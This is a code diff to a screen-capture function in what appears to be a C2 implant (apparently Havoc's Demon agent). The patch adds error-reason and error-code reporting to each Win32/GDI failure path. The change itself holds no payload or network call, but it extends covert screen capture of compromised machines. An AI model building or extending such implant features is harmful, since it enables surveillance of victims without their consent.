@@ -1085,7 +1085,9 @@ VOID AnonPipesRead(
  */
 BOOL WinScreenshot(
     OUT PVOID*  ImagePointer,
-    OUT PSIZE_T ImageSize
+    OUT PSIZE_T ImageSize,
+    OUT PCHAR*  ErrorReason,
+    OUT PDWORD  ErrorCode
 ) {
     BITMAPFILEHEADER    BitFileHdr  = { 0 };
     BITMAPINFOHEADER    BitInfoHdr  = { 0 };
@@ -1107,6 +1109,9 @@ BOOL WinScreenshot(
     HDESK               hDesk       = NULL;
     DWORD               dwThreadId  = 0;
 
+    if ( ErrorReason ) *ErrorReason = NULL;
+    if ( ErrorCode   ) *ErrorCode   = 0;
+
     /* Use SM_CX/CYVIRTUALSCREEN for extent; avoid GetCurrentObject+DeleteObject on the display DC bitmap (invalid + wrong size on some sessions). */
     INT x      = Instance->Win32.GetSystemMetrics( SM_XVIRTUALSCREEN );
     INT y      = Instance->Win32.GetSystemMetrics( SM_YVIRTUALSCREEN );
@@ -1115,6 +1120,8 @@ BOOL WinScreenshot(
 
     if ( width <= 0 || height <= 0 ) {
         PUTS( "GetSystemMetrics virtual screen size invalid" )
+        if ( ErrorReason ) *ErrorReason = "GetSystemMetrics returned invalid virtual screen size";
+        if ( ErrorCode   ) *ErrorCode   = NtGetLastError();
         goto Cleanup;
     }
 
@@ -1165,6 +1172,8 @@ BOOL WinScreenshot(
     hDC = Instance->Win32.GetDC( NULL );
     if ( ! hDC ) {
         PUTS( "GetDC failed" )
+        if ( ErrorReason ) *ErrorReason = "GetDC(NULL) failed — NULL display DC";
+        if ( ErrorCode   ) *ErrorCode   = NtGetLastError();
         goto Cleanup;
     }
 
@@ -1185,29 +1194,39 @@ BOOL WinScreenshot(
     BitMapImage = Instance->Win32.LocalAlloc( LPTR, BitMapSize );
     if ( ! BitMapImage ) {
         PUTS( "LocalAlloc failed" )
+        if ( ErrorReason ) *ErrorReason = "LocalAlloc failed — out of memory";
+        if ( ErrorCode   ) *ErrorCode   = NtGetLastError();
         goto Cleanup;
     }
 
     hMemDC  = Instance->Win32.CreateCompatibleDC( hDC );
     if ( ! hMemDC ) {
         PUTS( "CreateCompatibleDC failed" )
+        if ( ErrorReason ) *ErrorReason = "CreateCompatibleDC failed";
+        if ( ErrorCode   ) *ErrorCode   = NtGetLastError();
         goto Cleanup;
     }
 
     hBitmap = Instance->Win32.CreateDIBSection( hDC, &BitMapInfo, DIB_RGB_COLORS, ( VOID** ) &bBits, NULL, 0 );
     if ( ! hBitmap ) {
         PUTS( "CreateDIBSection failed" )
+        if ( ErrorReason ) *ErrorReason = "CreateDIBSection failed";
+        if ( ErrorCode   ) *ErrorCode   = NtGetLastError();
         goto Cleanup;
     }
 
     OldBmp = Instance->Win32.SelectObject( hMemDC, hBitmap );
     if ( ! OldBmp || OldBmp == HGDI_ERROR ) {
         PUTS( "SelectObject failed" )
+        if ( ErrorReason ) *ErrorReason = "SelectObject failed";
+        if ( ErrorCode   ) *ErrorCode   = NtGetLastError();
         goto Cleanup;
     }
 
     if ( ! Instance->Win32.BitBlt( hMemDC, 0, 0, width, height, hDC, x, y, SRCCOPY ) ) {
         PUTS( "BitBlt failed" )
+        if ( ErrorReason ) *ErrorReason = "BitBlt failed — screen capture blocked or GDI error";
+        if ( ErrorCode   ) *ErrorCode   = NtGetLastError();
         goto Cleanup;
     }
 
